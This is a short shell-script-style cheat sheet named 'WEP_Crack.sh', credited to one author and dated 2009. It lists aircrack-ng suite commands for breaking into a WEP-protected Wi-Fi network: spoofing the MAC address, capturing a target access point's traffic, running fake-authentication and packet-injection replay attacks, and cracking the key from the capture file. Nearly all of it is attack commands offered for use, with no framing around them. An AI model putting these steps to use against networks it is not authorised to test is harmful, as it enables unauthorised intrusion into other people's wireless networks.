#								#WEP_Crack.sh
# Created by Matthew Sage
# Last modified: 08/10/09

airmon-ng stop eth0
ifconfig eth0 down
macchanger --mac 00:11:22:33:44:55 eth0
airmon-ng start eth0
airodump-ng eth0
airodump-ng -c (channel) -w (file name) --bssid (bssid) eth0

#new terminal

aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 eth0

aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b (bssid) -h 00:11:22:33:44:55 eth0

#see packet press y

#open 3rd terminal

aircrack-ng (filename-01.cap)